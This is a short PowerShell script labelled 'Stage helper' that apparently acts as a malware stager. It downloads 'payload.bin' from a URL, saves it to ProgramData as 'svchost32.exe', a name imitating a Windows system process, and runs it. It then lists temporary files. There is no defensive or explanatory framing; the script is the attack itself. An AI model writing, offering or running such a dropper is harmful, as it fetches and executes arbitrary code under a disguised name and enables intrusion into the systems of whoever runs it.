# Stage helper
$Stage1Url = 'https://127.0.0.1:443/payload.bin'
$DropPath = "C:\ProgramData\svchost32.exe"
Invoke-WebRequest -Uri $Stage1Url -OutFile $DropPath -UseBasicParsing
Start-Process -FilePath $DropPath
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
